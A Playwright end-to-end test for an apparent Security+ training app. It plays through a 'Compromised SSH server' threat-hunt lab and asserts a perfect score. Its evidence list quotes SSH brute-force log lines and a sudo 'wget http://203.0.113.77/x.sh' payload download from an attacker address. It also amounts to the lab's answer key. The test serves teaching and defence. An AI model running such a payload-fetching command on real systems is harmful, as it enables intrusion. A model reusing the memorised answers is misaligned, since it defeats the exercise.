import { expect, test } from "@playwright/test";
import { registerOnboardPro } from "./helpers";

/**
 * The threat hunt: register, choose the exam, open "Hands-on labs" and the
 * threat hunt, flag the lines that are evidence, identify the attack, and
 * confirm that the hunt is scored 100%. It also confirms that the hunt is
 * analyzed at one press, with no dialog that asks whether to go on.
 *
 * The words the spec looks for are the components' own. Where one changes,
 * copy it from the component named beside it.
 */
test("threat hunt: flag evidence, identify attack, perfect score", async ({
  page,
}) => {
  await registerOnboardPro(page, { tag: "threathunt", cert: /Security\+/ });

  // The side bar's link to the labs (WorkspaceShell.tsx).
  await page.getByRole("link", { name: "Hands-on labs", exact: true }).first().click();
  await page.waitForURL("**/pbq");

  // The threat hunt is in the list that is shown first, under the tab
  // "Exam-style labs" (PbqScenarios.tsx). Its row is a button named by the
  // lab's title, its kind and its first sentence.
  await page.getByRole("button", { name: /Compromised SSH server/ }).click();
  await expect(
    page.getByRole("heading", { name: "Compromised SSH server" })
  ).toBeVisible();

  // Flag exactly the lines that are evidence (ThreatHuntPlayer.tsx: each line of
  // the log is a button named by its text). They are the lines that contain
  // these fragments: the burst of failed logins, the successful root login, the
  // download of the payload and the attacker's disconnect, all from 203.0.113.77
  // (src/data/pbq/security-plus-sy0-701/threat-hunts.ts).
  const maliciousFragments = [
    "Failed password for root from 203.0.113.77 port 40122",
    "Failed password for root from 203.0.113.77 port 40124",
    "Failed password for root from 203.0.113.77 port 40126",
    "Failed password for admin from 203.0.113.77 port 40130",
    "Failed password for root from 203.0.113.77 port 40140",
    "Accepted password for root from 203.0.113.77 port 40170",
    "COMMAND=/usr/bin/wget http://203.0.113.77/x.sh",
    "Received disconnect from 203.0.113.77 port 40170",
  ];
  for (const frag of maliciousFragments) {
    await page.getByRole("button", { name: new RegExp(escapeRe(frag)) }).click();
  }
  await expect(page.getByText(`You have flagged ${maliciousFragments.length} lines.`)).toBeVisible();

  // Identify the attack.
  await page
    .getByRole("radio", { name: /brute-force attack that succeeded/i })
    .click();

  // Analyze: one press on a plain button, with no dialog to confirm it.
  await page.getByRole("button", { name: "Analyze", exact: true }).click();

  // A perfect hunt: the score, its verdict (the hunt's word for the top band)
  // and the heading over the explanation.
  await expect(page.getByText("100%")).toBeVisible();
  await expect(page.getByText("Threat identified")).toBeVisible();
  await expect(
    page.getByRole("heading", { name: "What happened" })
  ).toBeVisible();
});

function escapeRe(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
